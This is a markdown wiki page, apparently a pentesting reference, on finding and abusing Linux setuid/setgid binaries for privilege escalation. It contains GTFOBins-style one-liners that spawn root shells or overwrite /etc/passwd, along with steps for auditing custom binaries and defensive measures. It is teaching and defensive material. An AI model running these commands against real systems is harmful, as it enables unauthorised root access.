---
title: SUID / SGID binaries
slug: suid-sgid-binaries
---

> **TL;DR:** Enumerate setuid/setgid binaries, cross-reference against GTFOBins for instant wins, and reverse-engineer custom ones — they're rarely as careful as the distro packages.

## What it is
A setuid binary runs with the effective UID of its file owner regardless of who invokes it (likewise setgid + EGID). Distros ship a small audited set (`passwd`, `sudo`, `ping`, `mount`, a few others); anything beyond that — particularly custom in-house binaries — is a high-yield audit target because it's running as root with attacker-controlled input.

## Preconditions / where it applies
- Local shell on a Linux host
- The mount you'll execute from must not be `nosuid`
- For "known binary" wins, the version must match what GTFOBins documents (sometimes distro patches disable the trick)
- For custom binaries, you need reverse-engineering tools — `strings`, `ltrace`, `strace`, `radare2`/`Ghidra`

## Technique

**Enumerate:**
```bash
find / -perm -4000 -type f 2>/dev/null              # setuid
find / -perm -2000 -type f 2>/dev/null              # setgid
find / -perm -6000 -type f 2>/dev/null              # both
find / \( -perm -4000 -o -perm -2000 \) -ls 2>/dev/null | sort
```

Diff against a baseline of the distro's expected setuid set — anything extra is suspicious.

**Triage 1 — GTFOBins.** For any known binary, check the "SUID" tab on https://gtfobins.github.io. Examples:
```bash
# find
./find . -exec /bin/sh -p \; -quit

# nmap (old versions with --interactive)
./nmap --interactive
# nmap> !sh

# cp / dd → overwrite /etc/passwd or /etc/shadow
./cp /tmp/evil_passwd /etc/passwd

# python3 (when setuid'd)
./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# vim.basic
./vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh","-p")'
```

Note `-p` to bash/sh — modern shells drop privileges when EUID != UID unless `-p` is set.

**Triage 2 — custom binary review.** When you find `/usr/local/bin/companytool` setuid root:

```bash
file /usr/local/bin/companytool
strings -n 8 /usr/local/bin/companytool | less
ltrace -e 'system+execl+execv+execlp+execvp+popen+getenv' /usr/local/bin/companytool 2>&1 | head -40
strace -fe execve,open,openat /usr/local/bin/companytool 2>&1 | head
```

Look for:
- `system("...")` / `popen("...")` with unqualified command names → [[path-hijacking]]
- `getenv("FOO")` of a config-controlling var that survives sanitization
- `fopen()` / `open()` of attacker-controllable paths without `O_NOFOLLOW` → symlink race
- `strcpy`/`sprintf`/`gets` on argv or env → memory-safety bug, but exploitation depends on mitigations (PIE/RELRO/canary/NX/ASLR/Seccomp)
- A `setuid(0)` followed by branching on a user-controlled flag — sometimes a debug menu

**Triage 3 — SGID for specific groups.** SGID `shadow` group on a helper means you can read `/etc/shadow` via that helper. SGID `docker` (if you discover a setgid wrapper) means you can talk to the docker socket → root.

**Triage 4 — capabilities-bearing binaries** are NOT setuid, so `find -perm -4000` won't catch them. Run [[capabilities-privesc]] in parallel.

## Detection and defence
- Hard distro baseline of setuid binaries; alert on additions
- Mount user-writable filesystems with `nosuid` (`/tmp`, `/home`, removable)
- Prefer capabilities (or even better, a privileged helper over a unix socket) to setuid
- AuditD watch on chmod/chown of files that set the suid bit (`auditctl -a always,exit -F arch=b64 -S chmod -F a1&0o4000`)
- Periodic `aide`/`tripwire` scans for new suid binaries

## References
- [GTFOBins](https://gtfobins.github.io/) — per-binary SUID/sudo/capabilities recipes
- [HackTricks — SUID](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#suid) — enumeration + custom binary tips
- [Secure Programming HOWTO — setuid](https://dwheeler.com/secure-programs/) — design pitfalls

Related: [[setuid-setgid-sticky]], [[capabilities-privesc]], [[sudo-misconfig]], [[path-hijacking]].
